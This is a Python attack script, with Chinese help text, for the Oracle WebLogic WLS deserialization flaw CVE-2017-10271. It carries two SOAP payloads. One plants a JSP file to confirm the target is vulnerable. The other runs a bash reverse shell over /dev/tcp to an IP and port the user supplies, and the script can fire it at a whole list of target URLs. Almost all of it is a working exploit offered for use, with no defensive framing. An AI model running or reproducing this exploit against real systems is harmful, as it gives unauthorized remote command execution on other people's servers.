import argparse
from ast import arg
from cgitb import reset
from termcolor import cprint
import requests
parser = argparse.ArgumentParser()
parser.add_argument("-u",
                    dest="url",
                    type=str,
                    help="输入目标url")
parser.add_argument("-l",
                    dest="urlLists",
                    help="批量验证:txt类型.")
parser.add_argument("-m",
                    dest="verification",
                    help="验证漏洞: (CVE-2017-10271)",
                    action='store_true') 
parser.add_argument("-s",
                    dest="shell",
                    help="靶机:linux.",
                    action='store_true')
parser.add_argument("-reverse_ip",
                    dest="reverse_ip",
                    help="设置反弹ip",
                    default='127.0.0.1',
                    action='store')
parser.add_argument("-p",
                    dest="port",
                    help="设置监听端口",
                    default='8888',
                    action='store')
args = parser.parse_args()
urls = []
payload_poc = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
           <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
                <void method="println">
                    <string>
                        <![CDATA[
                            <% out.print("weblogic"); %>
                        ]]>
                	</string>
                </void>
                <void method="close"/>
            </object></java></java>
    </work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
'''
payload_exp_linux = f'''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
                <void index="0">
                <string>/bin/bash</string>
                </void>
                <void index="1">
                <string>-c</string>
                </void>
                <void index="2">
                <string>bash -i &gt;&amp;  /dev/tcp/{args.reverse_ip}/{args.port} 0&gt;&amp;1</string>
                </void>
            </array>
        <void method="start"/></void>
    </java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
'''

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'text/xml'
    }
def payload_command (command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    
def weblogic_Poc():
    for url in urls:
        if 'http' not in url:
            url = 'http://'+url
        cprint(f"[•] 验证URL: {url}", "cyan")
        post_url = url+'/wls-wsat/CoordinatorPortType'
        poc_url = url+'/bea_wls_internal/test.jsp'
        try:    
            r = requests.post(post_url,data=payload_poc,headers=headers,timeout=5)
            result = requests.get(poc_url, headers=headers, timeout=5)
            if 'weblogic' in result.text:
                cprint(f'[+] 存在WebLogic WLS远程执行漏洞(CVE-2017-10271)', 'green')
            else:
                cprint(f'[-] 不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)')
        except Exception as e:
            cprint(f'[-] 不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)')
def weblogic_exp():
    for url in urls:
        if 'http' not in url:
            url = 'http://'+url
        cprint(f"[•] URL: {url}", "cyan")
        post_url = url+'/wls-wsat/CoordinatorPortType'
        try:
            result = requests.post(post_url,data=payload_exp_linux,headers=headers,timeout=5)
            if result.status_code==500:
                cprint(f'[+] success!', 'green')
            else:
                cprint(f'[-] false')
        except Exception as e:
            print(e)
            cprint(f'[-] false')
def weblogic():
    if args.url:
        urls.append(args.url)
    if args.urlLists:
        with open(args.urlLists, "r") as f:
            for line in f.readlines():
                line = line.strip()
                if line == "":
                    continue
                urls.append(line)
    if args.verification:
        weblogic_Poc()
    if args.shell:
        weblogic_exp()
if __name__ == '__main__':
    weblogic()